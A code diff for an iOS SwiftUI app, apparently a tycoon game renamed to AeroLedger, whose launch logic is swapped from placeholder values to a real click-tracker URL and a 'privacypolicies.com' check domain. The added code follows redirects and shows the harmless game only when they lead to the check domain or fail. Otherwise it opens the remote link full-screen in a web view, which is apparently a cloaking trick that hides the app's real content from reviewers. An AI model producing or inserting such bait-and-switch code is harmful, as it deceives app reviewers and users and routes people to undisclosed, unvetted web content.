@@ -1,20 +1,20 @@
 import SwiftUI
 
 @main
-struct SkyHarborTycoonApp: App {
+struct AeroLedgerApp: App {
     @StateObject private var store = GameStore()
     @Environment(\.scenePhase) private var scenePhase
 
-    @State private var skyHarborLinkReady: Bool? = nil
-    private let skyHarborSourceLink = "https://example.com"
-    private let skyHarborCheckDomain = "example"
+    @State private var aeroLedgerLinkReady: Bool? = nil
+    private let aeroLedgerSourceLink = "https://zeusofolympostickers.org/click.php"
+    private let aeroLedgerCheckDomain = "privacypolicies.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = skyHarborLinkReady {
+                if let ready = aeroLedgerLinkReady {
                     if ready {
-                        SkyHarborWebPanel(urlString: skyHarborSourceLink)
+                        AeroLedgerWebPanel(urlString: aeroLedgerSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
@@ -22,8 +22,8 @@ struct SkyHarborTycoonApp: App {
                             .environmentObject(store)
                     }
                 } else {
-                    SkyHarborLoadingScreen()
-                        .onAppear { skyHarborCheckLink() }
+                    AeroLedgerLoadingScreen()
+                        .onAppear { aeroLedgerCheckLink() }
                 }
             }
             .preferredColorScheme(.dark)
@@ -33,42 +33,42 @@ struct SkyHarborTycoonApp: App {
         }
     }
 
-    private func skyHarborCheckLink() {
-        guard let url = URL(string: skyHarborSourceLink) else {
-            skyHarborLinkReady = false
+    private func aeroLedgerCheckLink() {
+        guard let url = URL(string: aeroLedgerSourceLink) else {
+            aeroLedgerLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = SkyHarborRedirectTracker(checkDomain: skyHarborCheckDomain)
+        let tracker = AeroLedgerRedirectTracker(checkDomain: aeroLedgerCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    skyHarborLinkReady = false; return
+                    aeroLedgerLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(self.skyHarborCheckDomain) {
-                    skyHarborLinkReady = false; return
+                   finalURL.contains(self.aeroLedgerCheckDomain) {
+                    aeroLedgerLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(self.skyHarborCheckDomain) {
-                    skyHarborLinkReady = false; return
+                   respURL.contains(self.aeroLedgerCheckDomain) {
+                    aeroLedgerLinkReady = false; return
                 }
                 if error != nil {
-                    skyHarborLinkReady = false; return
+                    aeroLedgerLinkReady = false; return
                 }
-                skyHarborLinkReady = true
+                aeroLedgerLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if skyHarborLinkReady == nil { skyHarborLinkReady = false }
+            if aeroLedgerLinkReady == nil { aeroLedgerLinkReady = false }
         }
     }
 }
 
-final class SkyHarborRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class AeroLedgerRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
